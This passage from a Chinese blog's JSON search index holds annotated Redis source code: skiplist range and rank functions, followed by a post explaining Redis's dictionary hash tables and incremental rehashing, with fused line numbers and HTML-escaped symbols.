NULL || !zslValueGteMin(x-&gt;score,range)) return 0; // 检查最小分值 x = zsl-&gt;header-&gt;level[0].forward; if (x == NULL || !zslValueLteMax(x-&gt;score,range)) return 0; return 1;&#125;/* Find the first node that is contained in the specified range. * * 返回 zsl 中第一个分值符合 range 中指定范围的节点。 * Returns NULL when no element is contained in the range. * * 如果 zsl 中没有符合范围的节点，返回 NULL 。 * * T_wrost = O(N), T_avg = O(log N) */zskiplistNode *zslFirstInRange(zskiplist *zsl, zrangespec *range) &#123; zskiplistNode *x; int i; /* If everything is out of range, return early. */ if (!zslIsInRange(zsl,range)) return NULL; // 遍历跳跃表，查找符合范围 min 项的节点 // T_wrost = O(N), T_avg = O(log N) x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; /* Go forward while *OUT* of range. */ while (x-&gt;level[i].forward &amp;&amp; !zslValueGteMin(x-&gt;level[i].forward-&gt;score,range)) x = x-&gt;level[i].forward; &#125; /* This is an inner range, so the next node cannot be NULL. */ x = x-&gt;level[0].forward; redisAssert(x != NULL); /* Check if score &lt;= max. */ // 检查节点是否符合范围的 max 项 // T = O(1) if (!zslValueLteMax(x-&gt;score,range)) return NULL; return x;&#125;/* Find the last node that is contained in the specified range. * Returns NULL when no element is contained in the range. * * 返回 zsl 中最后一个分值符合 range 中指定范围的节点。 * * 如果 zsl 中没有符合范围的节点，返回 NULL 。 * * T_wrost = O(N), T_avg = O(log N) */zskiplistNode *zslLastInRange(zskiplist *zsl, zrangespec *range) &#123; zskiplistNode *x; int i; /* If everything is out of range, return early. */ // 先确保跳跃表中至少有一个节点符合 range 指定的范围， // 否则直接失败 // T = O(1) if (!zslIsInRange(zsl,range)) return NULL; // 遍历跳跃表，查找符合范围 max 项的节点 // T_wrost = O(N), T_avg = O(log N) x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; /* Go forward while *IN* range. */ while (x-&gt;level[i].forward &amp;&amp; zslValueLteMax(x-&gt;level[i].forward-&gt;score,range)) x = x-&gt;level[i].forward; &#125; /* This is an inner range, so this node cannot be NULL. */ redisAssert(x != NULL); /* Check if score &gt;= min. */ // 检查节点是否符合范围的 min 项 // T = O(1) if (!zslValueGteMin(x-&gt;score,range)) return NULL; // 返回节点 return x;&#125;/* Delete all the elements with score between min and max from the skiplist. * * 删除所有分值在给定范围之内的节点。 * * Min and max are inclusive, so a score &gt;= min || score &lt;= max is deleted. * * min 和 max 参数都是包含在范围之内的，所以分值 &gt;= min 或 &lt;= max 的节点都会被删除。 * * Note that this function takes the reference to the hash table view of the * sorted set, in order to remove the elements from the hash table too. * * 节点不仅会从跳跃表中删除，而且会从相应的字典中删除。 * * 返回值为被删除节点的数量 * * T = O(N) */unsigned long zslDeleteRangeByScore(zskiplist *zsl, zrangespec *range, dict *dict) &#123; zskiplistNode *update[ZSKIPLIST_MAXLEVEL], *x; unsigned long removed = 0; int i; // 记录所有和被删除节点（们）有关的节点 // T_wrost = O(N) , T_avg = O(log N) x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; while (x-&gt;level[i].forward &amp;&amp; (range-&gt;minex ? x-&gt;level[i].forward-&gt;score &lt;= range-&gt;min : x-&gt;level[i].forward-&gt;score &lt; range-&gt;min)) x = x-&gt;level[i].forward; update[i] = x; &#125; /* Current node is the last with score &lt; or &lt;= min. */ // 定位到给定范围开始的第一个节点 x = x-&gt;level[0].forward; /* Delete nodes while in range. */ // 删除范围中的所有节点 // T = O(N) while (x &amp;&amp; (range-&gt;maxex ? x-&gt;score &lt; range-&gt;max : x-&gt;score &lt;= range-&gt;max)) &#123; // 记录下个节点的指针 zskiplistNode *next = x-&gt;level[0].forward; zslDeleteNode(zsl,x,update); dictDelete(dict,x-&gt;obj); zslFreeNode(x); removed++; x = next; &#125; return removed;&#125;unsigned long zslDeleteRangeByLex(zskiplist *zsl, zlexrangespec *range, dict *dict) &#123; zskiplistNode *update[ZSKIPLIST_MAXLEVEL], *x; unsigned long removed = 0; int i; x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; while (x-&gt;level[i].forward &amp;&amp; !zslLexValueGteMin(x-&gt;level[i].forward-&gt;obj,range)) x = x-&gt;level[i].forward; update[i] = x; &#125; /* Current node is the last with score &lt; or &lt;= min. */ x = x-&gt;level[0].forward; /* Delete nodes while in range. */ while (x &amp;&amp; zslLexValueLteMax(x-&gt;obj,range)) &#123; zskiplistNode *next = x-&gt;level[0].forward; // 从跳跃表中删除当前节点 zslDeleteNode(zsl,x,update); // 从字典中删除当前节点 dictDelete(dict,x-&gt;obj); // 释放当前跳跃表节点的结构 zslFreeNode(x); // 增加删除计数器 removed++; // 继续处理下个节点 x = next; &#125; // 返回被删除节点的数量 return removed;&#125;/* Delete all the elements with rank between start and end from the skiplist. * * 从跳跃表中删除所有给定排位内的节点。 * * Start and end are inclusive. Note that start and end need to be 1-based * * start 和 end 两个位置都是包含在内的。注意它们都是以 1 为起始值。 * * 函数的返回值为被删除节点的数量。 * * T = O(N) */unsigned long zslDeleteRangeByRank(zskiplist *zsl, unsigned int start, unsigned int end, dict *dict) &#123; zskiplistNode *update[ZSKIPLIST_MAXLEVEL], *x; unsigned long traversed = 0, removed = 0; int i; // 沿着前进指针移动到指定排位的起始位置，并记录所有沿途指针 // T_wrost = O(N) , T_avg = O(log N) x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; while (x-&gt;level[i].forward &amp;&amp; (traversed + x-&gt;level[i].span) &lt; start) &#123; traversed += x-&gt;level[i].span; x = x-&gt;level[i].forward; &#125; update[i] = x; &#125; // 移动到排位的起始的第一个节点 traversed++; x = x-&gt;level[0].forward; // 删除所有在给定排位范围内的节点 // T = O(N) while (x &amp;&amp; traversed &lt;= end) &#123; // 记录下一节点的指针 zskiplistNode *next = x-&gt;level[0].forward; // 从跳跃表中删除节点 zslDeleteNode(zsl,x,update); // 从字典中删除节点 dictDelete(dict,x-&gt;obj); // 释放节点结构 zslFreeNode(x); // 为删除计数器增一 removed++; // 为排位计数器增一 traversed++; // 处理下个节点 x = next; &#125; // 返回被删除节点的数量 return removed;&#125;/* Find the rank for an element by both score and key. * * 查找包含给定分值和成员对象的节点在跳跃表中的排位。 * * Returns 0 when the element cannot be found, rank otherwise. * * 如果没有包含给定分值和成员对象的节点，返回 0 ，否则返回排位。 * * Note that the rank is 1-based due to the span of zsl-&gt;header to the * first element. * * 注意，因为跳跃表的表头也被计算在内，所以返回的排位以 1 为起始值。 * * T_wrost = O(N), T_avg = O(log N) */unsigned long zslGetRank(zskiplist *zsl, double score, robj *o) &#123; zskiplistNode *x; unsigned long rank = 0; int i; // 遍历整个跳跃表 x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; // 遍历节点并对比元素 while (x-&gt;level[i].forward &amp;&amp; (x-&gt;level[i].forward-&gt;score &lt; score || // 比对分值 (x-&gt;level[i].forward-&gt;score == score &amp;&amp; // 比对成员对象 compareStringObjects(x-&gt;level[i].forward-&gt;obj,o) &lt;= 0))) &#123; // 累积跨越的节点数量 rank += x-&gt;level[i].span; // 沿着前进指针遍历跳跃表 x = x-&gt;level[i].forward; &#125; /* x might be equal to zsl-&gt;header, so test if obj is non-NULL */ // 必须确保不仅分值相等，而且成员对象也要相等 // T = O(N) if (x-&gt;obj &amp;&amp; equalStringObjects(x-&gt;obj,o)) &#123; return rank; &#125; &#125; // 没找到 return 0;&#125;/* Finds an element by its rank. The rank argument needs to be 1-based. * * 根据排位在跳跃表中查找元素。排位的起始值为 1 。 * * 成功查找返回相应的跳跃表节点，没找到则返回 NULL 。 * * T_wrost = O(N), T_avg = O(log N) */zskiplistNode* zslGetElementByRank(zskiplist *zsl, unsigned long rank) &#123; zskiplistNode *x; unsigned long traversed = 0; int i; // T_wrost = O(N), T_avg = O(log N) x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; // 遍历跳跃表并累积越过的节点数量 while (x-&gt;level[i].forward &amp;&amp; (traversed + x-&gt;level[i].span) &lt;= rank) &#123; traversed += x-&gt;level[i].span; x = x-&gt;level[i].forward; &#125; // 如果越过的节点数量已经等于 rank // 那么说明已经到达要找的节点 if (traversed == rank) &#123; return x; &#125; &#125; // 没找到目标节点 return NULL;&#125;/* Populate the rangespec according to the objects min and max. * * 对 min 和 max 进行分析，并将区间的值保存在 spec 中。 * * 分析成功返回 REDIS_OK ，分析出错导致失败返回 REDIS_ERR 。 * * T = O(N) */static int zslParseRange(robj *min, robj *max, zrangespec *spec) &#123; char *eptr; // 默认为闭区间 spec-&gt;minex = spec-&gt;maxex = 0; /* Parse the min-max interval. If one of the values is prefixed * by the \"(\" character, it's considered \"open\". For instance * ZRANGEBYSCORE zset (1.5 (2.5 will match min &lt; x &lt; max * ZRANGEBYSCORE zset 1.5 2.5 will instead match min &lt;= x &lt;= max */ if (min-&gt;encoding == REDIS_ENCODING_INT) &#123; // min 的值为整数，开区间 spec-&gt;min = (long)min-&gt;ptr; &#125; else &#123; // min 对象为字符串，分析 min 的值并决定区间 if (((char*)min-&gt;ptr)[0] == '(') &#123; // T = O(N) spec-&gt;min = strtod((char*)min-&gt;ptr+1,&amp;eptr); if (eptr[0] != '\\0' || isnan(spec-&gt;min)) return REDIS_ERR; spec-&gt;minex = 1; &#125; else &#123; // T = O(N) spec-&gt;min = strtod((char*)min-&gt;ptr,&amp;eptr); if (eptr[0] != '\\0' || isnan(spec-&gt;min)) return REDIS_ERR; &#125; &#125; if (max-&gt;encoding == REDIS_ENCODING_INT) &#123; // max 的值为整数，开区间 spec-&gt;max = (long)max-&gt;ptr; &#125; else &#123; // max 对象为字符串，分析 max 的值并决定区间 if (((char*)max-&gt;ptr)[0] == '(') &#123; // T = O(N) spec-&gt;max = strtod((char*)max-&gt;ptr+1,&amp;eptr); if (eptr[0] != '\\0' || isnan(spec-&gt;max)) return REDIS_ERR; spec-&gt;maxex = 1; &#125; else &#123; // T = O(N) spec-&gt;max = strtod((char*)max-&gt;ptr,&amp;eptr); if (eptr[0] != '\\0' || isnan(spec-&gt;max)) return REDIS_ERR; &#125; &#125; return REDIS_OK;&#125; 跳跃表是有序集合实现的底层之一跳跃表层数是1-32随机数节点内容对象唯一，分数不唯一","path":"2019/04/18/redis源码-skiplist/","date":"04-18","excerpt":"跳跃表概念跳跃表是一种有序数据结构，他通过在每个节点中维持多个指向其他节点的指针，从而达到快速访问的目的。跳跃表支持平均O(logN)、最坏O(N)复杂度的节点查找，还可以通过顺序性操作来批量处理节点。Redis使用跳跃表作为有序集合键的底层实现之一，如果一个有序集合包含的元素数量比较多，又或者有序集合中元素的成员是比较长的字符串时，redis就会使用跳跃表作为有序集合键的底层实现。redis只有两个地方使用了跳跃表，一个是实现有序集合键，另一个是在集群节点中用作内部数据结构。","tags":[{"name":"源码","slug":"源码","permalink":"https://jijiking51.cn/tags/源码/"}],"preview":"http://img.jijiking51.cn/redis源码-skiplist.jpg"},{"title":"redis源码-字典","text":"字典的实现概念Redis的字典是使用哈希表作为底层实现原理的，一个哈希表可以有多个哈希表节点，而每个哈希表节点就保存了字典中的一个键值对。哈希表1234567891011121314151617181920212223/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. *//* * 哈希表 * * 每个字典都使用两个哈希表，从而实现渐进式 rehash 。 */typedef struct dictht &#123; // 哈希表数组 dictEntry **table; // 哈希表大小 unsigned long size; // 哈希表大小掩码，用于计算索引值 // 总是等于 size - 1 unsigned long sizemask; // 该哈希表已有节点的数量 unsigned long used;&#125; dictht; table是一个数组，数组中的每个元素都是一个哈希节点，哈希表中的size属性记录了哈希表的大小，也就是table数组的大小，而used属性记录了目前已有节点的数量。sizemask属性的值总是等于size-1，这个属性和哈希值一起决定一个键应该被放到table数组的哪个索引上面。 哈希表节点12345678910111213141516171819/* * 哈希表节点 */typedef struct dictEntry &#123; // 键 void *key; // 值 union &#123; void *val; uint64_t u64; int64_t s64; &#125; v; // 指向下个哈希表节点，形成链表 struct dictEntry *next;&#125; dictEntry; key属性保存着键值对中的键，而v属性则保存键值对中的值，其中键值对的值可以是一个指针或者一个unint64_t整数或者int64_t整数。next属性是指向另一个哈希表节点的指针，这个指针可以将多个哈希值相同的键值对链接在一起，以此解决冲突问题。例如k1和k0的索引值相同将会如下图： 字典12345678910111213141516171819202122/* * 字典 */typedef struct dict &#123; // 类型特定函数 dictType *type; // 私有数据 void *privdata; // 哈希表 dictht ht[2]; // rehash 索引 // 当 rehash 不在进行时，值为 -1 int rehashidx; /* rehashing not in progress if rehashidx == -1 */ // 目前正在运行的安全迭代器的数量 int iterators; /* number of iterators currently running */&#125; dict; type属性和privdata属性针对不同类型的键值对，为创建多态字典而设置的 type属性是一个指向dictType结构的指针，每个dictType结构保存了一簇用于操作特定类型键值对的函数，redis会为用途不同的字典设置不同的类型特定函数 privdata属性则保存了需要传给哪些类型特定函数的可选参数 ht是一个包含两个项的数组，数组中的每个项都是一个dictht哈希表，一般情况下，字典只使用ht[0]哈希表，ht[1]哈希表只会在对ht[0]哈希表进行rehash时使用。除了ht[1]之外，另一个rehash有关的属性就是rehashidx，它记录了rehash目前的进度，如果目前没有在进行rehash，那么他的值为-1。 123456789101112131415161718192021222324/* * 字典类型特定函数 */typedef struct dictType &#123; // 计算哈希值的函数 unsigned int (*hashFunction)(const void *key); // 复制键的函数 void *(*keyDup)(void *privdata, const void *key); // 复制值的函数 void *(*valDup)(void *privdata, const void *obj); // 对比键的函数 int (*keyCompare)(void *privdata, const void *key1, const void *key2); // 销毁键的函数 void (*keyDestructor)(void *privdata, void *key); // 销毁值的函数 void (*valDestructor)(void *privdata, void *obj);&#125; dictType; hash算法hash实现当一个新的键值对添加到字典里面时，程序需要先根据键值对的键值计算出哈希值和索引值，然后再根据索引值，将包含新键值对的哈希表节点放到哈希表数组的指定索引上面。 redis计算hash值和索引值的方法: 123456# 使用字典设置的哈希函数，计算键key的哈希值hash = dict-&gt;type-&gt;hashFunction(key);# 使用hash表的sizemask属性和哈希值，计算出索引值# 根据情况不同，ht[x]可以是ht[0]或者ht[1]index = hash &amp; dict-&gt;ht[x].sizemask; 如果我们要将键值对k0和v0添加到字典里面，流程如下： hash = dict-&gt;type-&gt;hashFunction(k0); 计算k0的哈希值。如果计算为8 index = hash&amp;dict-&gt;ht[0].sizemask = 8 &amp; 3 = 0; 计算出键k0的索引值0，这表示包含键值对k0和v0的节点应该被放置到哈希表数组的索引0位置上 当字典被用作数据库底层实现，或者哈希键的底层是现时，redis使用murmurHash2算法来计算键的哈希值 解决键冲突当有两个或以上数量的键被分配到了哈希表数组的同一个索引上面时，我们称这些键发生了冲突。redis的哈希表使用链地址法来解决键冲突，每个哈希表节点都有一个next指针，多个哈希表节点可以用next指针构成一个单向链表，被分配到同一个索引上的多个节点可以用这个单向链表连接起来，这就解决了键冲突的问题。例如将键值对k2和v2添加到哈希表中，并且计算出k2的索引为2，与k1冲突，那么解决冲突的办法就是使用next指针将键k2和k1所在的节点连接起来。因为dictEntry节点组成的链表没有指向链表表尾的指针，所以为了速度考虑，程序总是将新节点添加到链表的头位置，排在其他已有的节点前面。 rehash随着操作的执行，哈希表保存的键值对会逐渐增多或者减少，为了让哈希表的负载因子位置在一个合理的范围之内，当哈希表保存的键值对数量太多或者太少时，程序需要对哈希表的大小进行相应的扩展或者收缩。rehash操作流程： 为字典的ht[1]哈希表分配空间，这个哈希表的空间大小取决于要执行的操作，以及ht[0]当前包含的键值对数量(也即是ht[0].used属性的值)： 如果执行的是扩展操作，那么ht[1]的大小为第一个大小等于ht[0].used*2的2^n 如果执行的是收缩操作，那么ht[1]的大小为第一个大于等于ht[0].used的2^n。 将保存在ht[0]中所有键值对rehash到ht[1]上面：rehash指的是重新计算键的哈希值和索引值，然后将键值对放置到ht[1]哈希表的指定位置上 当ht[0]包含的所有键值对都迁移到了ht[1]之后，石方ht[0]，将ht[1]设置为ht[0]，并且在ht[1]新创建一个空哈希表为下一次rehash做准备 例如，要对下图的ht[0]进行扩展操作，那么程序将执行以下步骤： ht[0].used 当前的值为 4 ， 4 * 2 = 8 ， 而 8 （2^3）恰好是第一个大于等于 4 的 2 的 n 次方， 所以程序会将 ht[1] 哈希表的大小设置为 8 。 将 ht[0] 包含的四个键值对都 rehash 到 ht[1] ， 释放 ht[0] ，并将 ht[1] 设置为 ht[0] ，然后为 ht[1] 分配一个空白哈希表， 至此，对哈希表的扩展操作执行完毕， 程序成功将哈希表的大小从原来的4改为了现在的8。 哈希表的扩展与收缩当以下条件中的任意一个被满足时， 程序会自动开始对哈希表执行扩展操作： 服务器目前没有在执行 BGSAVE 命令或者 BGREWRITEAOF 命令， 并且哈希表的负载因子大于等于 1 ； 服务器目前正在执行 BGSAVE 命令或者 BGREWRITEAOF 命令， 并且哈希表的负载因子大于等于 5 ；其中哈希表的负载因子可以通过公式： #负载因子 = 哈希表已保存节点数量 / 哈希表大小 load_factor = ht[0].used / ht[0].size计算得出。 比如说， 对于一个大小为 4 ， 包含 4 个键值对的哈希表来说， 这个哈希表的负载因子为： load_factor = 4 / 4 = 1 又比如说， 对于一个大小为 512 ， 包含 256 个键值对的哈希表来说， 这个哈希表的负载因子为： load_factor = 256 / 512 = 0.5 根据 BGSAVE 命令或 BGREWRITEAOF 命令是否正在执行， 服务器执行扩展操作所需的负载因子并不相同， 这是因为在执行 BGSAVE 命令或BGREWRITEAOF 命令的过程中， Redis 需要创建当前服务器进程的子进程， 而大多数操作系统都采用写时复制（copy-on-write）技术来优化子进程的使用效率， 所以在子进程存在期间， 服务器会提高执行扩展操作所需的负载因子， 从而尽可能地避免在子进程存在期间进行哈希表扩展操作， 这可以避免不必要的内存写入操作， 最大限度地节约内存。 另一方面， 当哈希表的负载因子小于 0.1 时， 程序自动开始对哈希表执行收缩操作。 渐进式rehash扩展或者搜索哈希表需要将ht[0]里面的所有键值对rehash到ht[1]，但是这个动作并不是一次性、集中式的完成的，二十分多次、渐进式地完成的。这样做的原因在于，如果ht[0]里面保存大量键值对时，一次将这些键值对rehash到ht[1]的话，庞大的计算量可能会导致服务器在一段时间内暂停服务。因此为了避免rehash对服务器的性能造成太大影响，服务器将进行多次rehash。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106/* * 在给定毫秒数内，以 100 步为单位，对字典进行 rehash 。 * * T = O(N) */int dictRehashMilliseconds(dict *d, int ms) &#123; // 记录开始时间 long long start = timeInMilliseconds(); int rehashes = 0; while(dictRehash(d,100)) &#123; rehashes += 100; // 如果时间已过，跳出 if (timeInMilliseconds()-start &gt; ms) break; &#125; return rehashes;&#125;/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * 执行 N 步渐进式 rehash 。 * * 返回 1 表示仍有键需要从 0 号哈希表移动到 1 号哈希表， * 返回 0 则表示所有键都已经迁移完毕。 * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table. * * 注意，每步 rehash 都是以一个哈希表索引（桶）作为单位的， * 一个桶里可能会有多个节点， * 被 rehash 的桶里的所有节点都会被移动到新哈希表。 * * T = O(N) */int dictRehash(dict *d, int n) &#123; // 只可以在 rehash 进行中时执行 if (!dictIsRehashing(d)) return 0; // 进行 N 步迁移 // T = O(N) while(n--) &#123; dictEntry *de, *nextde; /* Check if we already rehashed the whole table... */ // 如果 0 号哈希表为空，那么表示 rehash 执行完毕 // T = O(1) if (d-&gt;ht[0].used == 0) &#123; // 释放 0 号哈希表 zfree(d-&gt;ht[0].table); // 将原来的 1 号哈希表设置为新的 0 号哈希表 d-&gt;ht[0] = d-&gt;ht[1]; // 重置旧的 1 号哈希表 _dictReset(&amp;d-&gt;ht[1]); // 关闭 rehash 标识 d-&gt;rehashidx = -1; // 返回 0 ，向调用者表示 rehash 已经完成 return 0; &#125; /* Note that rehashidx can't overflow as we are sure there are more * elements because ht[0].used != 0 */ // 确保 rehashidx 没有越界 assert(d-&gt;ht[0].size &gt; (unsigned)d-&gt;rehashidx); // 略过数组中为空的索引，找到下一个非空索引 while(d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) d-&gt;rehashidx++; // 指向该索引的链表表头节点 de = d-&gt;ht[0].table[d-&gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ // 将链表中的所有节点迁移到新哈希表 // T = O(1) while(de) &#123; unsigned int h; // 保存下个节点的指针 nextde = de-&gt;next; /* Get the index in the new hash table */ // 计算新哈希表的哈希值，以及节点插入的索引位置 h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask; // 插入节点到新哈希表 de-&gt;next = d-&gt;ht[1].table[h]; d-&gt;ht[1].table[h] = de; // 更新计数器 d-&gt;ht[0].used--; d-&gt;ht[1].used++; // 继续处理下个节点 de = nextde; &#125; // 将刚迁移完的哈希表索引的指针设为空 d-&gt;ht[0].table[d-&gt;rehashidx] = NULL; // 更新 rehash 索引 d-&gt;rehashidx++; &#125; return 1;&#125; 步骤： 为ht[1]分配空间，让字典同时持有ht[0]、ht[1]两个哈希表 在字典中维持一个索引计数器变量rehashidx，并且它的值设置为0，表示rehash正式开始 在rehash期间，每次对字典执行添加、删除、查找或者更新操作时，程序除了执行指定的操作以外，还会顺带将ht[0]哈希表在rehashidx索引上的所有键值对rehash到ht[1]，当rehash工作完成之后，程序将rehashidx属性的值增1 在某个时间点上，ht[0]的所有键值对都会被rehash到ht[1]，这时设置rehashidx为-1，表示rehash已经完成 渐进式是采用分治的方式，将rehash键值对所需要的计算工作均摊到对字典的每个添加、删除、查找和更新操作上，从而避免庞大的计算量 rehash期间的哈希表操作 因为在进行渐进式rehash的过程中，字典会同时使用 ht[0]和ht[1]两个哈希表，所以在渐进式rehash进行期间，字典的删除（delete）、查找（find）、更新（update）等操作会在两个哈希表上进行：比如说， 要在字典里面查找一个键的话，程序会先在ht[0]里面进行查找，如果没找到的话，就会继续到ht[1]里面进行查找，诸如此类。 另外，在渐进式rehash执行期间，新添加到字典的键值对一律会被保存到ht[1]里面，而ht[0]则不再进行任何添加操作：这一措施保证了ht[0]包含的键值对数量会只减不增，并随着rehash操作的执行而最终变成空表 字典API常用API 函数 作用 时间复杂度 dictCreate 创建一个新的字典。 O(1) dictAdd 将给定的键值对添加到字典里面。 O(1) dictReplace 将给定的键值对添加到字典里面，如果键已经存在于字典，那么用新值取代原有的值。 O(1) dictFetchValue 返回给定键的值。 O(1) dictGetRandomKey 从字典中随机返回一个键值对。 O(1) dictDelete 从字典中删除给定键所对应的键值对。 O(1) dictRelease 释放给定字典，以及字典中包含的所有键值对。 O(N)，N为字典包含的键值对数量。 代码注解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880881882883884885886887888889890891892893894895896897898899900901902903904905906907908909910911912913914915916917918919920921922923924925926927928929930931932933934935936937938939940941942943944945946947948949950951952953954955956957958959960961962963964965966967968969970971972973974975976977978979980981982983984985986987988989990991992993994995996997998999100010011002100310041005100610071008100910101011101210131014101510161017101810191020102110221023102410251026102710281029103010311032103310341035103610371038103910401041104210431044104510461047104810491050105110521053105410551056105710581059106010611062106310641065106610671068106910701071107210731074107510761077107810791080108110821083108410851086108710881089109010911092109310941095109610971098109911001101110211031104110511061107110811091110111111121113111411151116111711181119112011211122112311241125112611271128112911301131113211331134113511361137113811391140114111421143114411451146114711481149115011511152115311541155115611571158115911601161116211631164116511661167116811691170117111721173117411751176117711781179118011811182118311841185118611871188118911901191119211931194119511961197119811991200120112021203120412051206120712081209121012111212121312141215121612171218121912201221122212231224122512261227122812291230123112321233123412351236123712381239124012411242124312441245124612471248124912501251125212531254125512561257125812591260126112621263126412651266126712681269127012711272127312741275127612771278127912801281128212831284128512861287128812891290129112921293129412951296129712981299130013011302130313041305130613071308130913101311131213131314131513161317131813191320132113221323132413251326132713281329133013311332133313341335133613371338133913401341134213431344134513461347134813491350135113521353135413551356/* * 重置（或初始化）给定哈希表的各项属性值 * * p.s. 上面的英文注释已经过期 * * T = O(1) */static void _dictReset(dictht *ht)&#123; ht-&gt;table = NULL; ht-&gt;size = 0; ht-&gt;sizemask = 0; ht-&gt;used = 0;&#125;/* Create a new hash table *//* * 创建一个新的字典 * * T = O(1) */dict *dictCreate(dictType *type, void *privDataPtr)&#123; dict *d = zmalloc(sizeof(*d)); _dictInit(d,type,privDataPtr); return d;&#125;/* Initialize the hash table *//* * 初始化哈希表 * * T = O(1) */int _dictInit(dict *d, dictType *type, void *privDataPtr)&#123; // 初始化两个哈希表的各项属性值 // 但暂时还不分配内存给哈希表数组 _dictReset(&amp;d-&gt;ht[0]); _dictReset(&amp;d-&gt;ht[1]); // 设置类型特定函数 d-&gt;type = type; // 设置私有数据 d-&gt;privdata = privDataPtr; // 设置哈希表 rehash 状态 d-&gt;rehashidx = -1; // 设置字典的安全迭代器数量 d-&gt;iterators = 0; return DICT_OK;&#125;/* Resize the table to the minimal size that contains all the elements, * but with the invariant of a USED/BUCKETS ratio near to &lt;= 1 *//* * 缩小给定字典 * 让它的已用节点数和字典大小之间的比率接近 1:1 * * 返回 DICT_ERR 表示字典已经在 rehash ，或者 dict_can_resize 为假。 * * 成功创建体积更小的 ht[1] ，可以开始 resize 时，返回 DICT_OK。 * * T = O(N) */int dictResize(dict *d)&#123; int minimal; // 不能在关闭 rehash 或者正在 rehash 的时候调用 if (!dict_can_resize || dictIsRehashing(d)) return DICT_ERR; // 计算让比率接近 1：1 所需要的最少节点数量 minimal = d-&gt;ht[0].used; if (minimal &lt; DICT_HT_INITIAL_SIZE) minimal = DICT_HT_INITIAL_SIZE; // 调整字典的大小 // T = O(N) return dictExpand(d, minimal);&#125;/* Expand or create the hash table *//* * 创建一个新的哈希表，并根据字典的情况，选择以下其中一个动作来进行： * * 1) 如果字典的 0 号哈希表为空，那么将新哈希表设置为 0 号哈希表 * 2) 如果字典的 0 号哈希表非空，那么将新哈希表设置为 1 号哈希表， * 并打开字典的 rehash 标识，使得程序可以开始对字典进行 rehash * * size 参数不够大，或者 rehash 已经在进行时，返回 DICT_ERR 。 * * 成功创建 0 号哈希表，或者 1 号哈希表时，返回 DICT_OK 。 * * T = O(N) */int dictExpand(dict *d, unsigned long size)&#123; // 新哈希表 dictht n; /* the new hash table */ // 根据 size 参数，计算哈希表的大小 // T = O(1) unsigned long realsize = _dictNextPower(size); /* the size is invalid if it is smaller than the number of * elements already inside the hash table */ // 不能在字典正在 rehash 时进行 // size 的值也不能小于 0 号哈希表的当前已使用节点 if (dictIsRehashing(d) || d-&gt;ht[0].used &gt; size) return DICT_ERR; /* Allocate the new hash table and initialize all pointers to NULL */ // 为哈希表分配空间，并将所有指针指向 NULL n.size = realsize; n.sizemask = realsize-1; // T = O(N) n.table = zcalloc(realsize*sizeof(dictEntry*)); n.used = 0; /* Is this the first initialization? If so it's not really a rehashing * we just set the first hash table so that it can accept keys. */ // 如果 0 号哈希表为空，那么这是一次初始化： // 程序将新哈希表赋给 0 号哈希表的指针，然后字典就可以开始处理键值对了。 if (d-&gt;ht[0].table == NULL) &#123; d-&gt;ht[0] = n; return DICT_OK; &#125; /* Prepare a second hash table for incremental rehashing */ // 如果 0 号哈希表非空，那么这是一次 rehash ： // 程序将新哈希表设置为 1 号哈希表， // 并将字典的 rehash 标识打开，让程序可以开始对字典进行 rehash d-&gt;ht[1] = n; d-&gt;rehashidx = 0; return DICT_OK; /* 顺带一提，上面的代码可以重构成以下形式： if (d-&gt;ht[0].table == NULL) &#123; // 初始化 d-&gt;ht[0] = n; &#125; else &#123; // rehash d-&gt;ht[1] = n; d-&gt;rehashidx = 0; &#125; return DICT_OK; */&#125;/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * 执行 N 步渐进式 rehash 。 * * 返回 1 表示仍有键需要从 0 号哈希表移动到 1 号哈希表， * 返回 0 则表示所有键都已经迁移完毕。 * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from 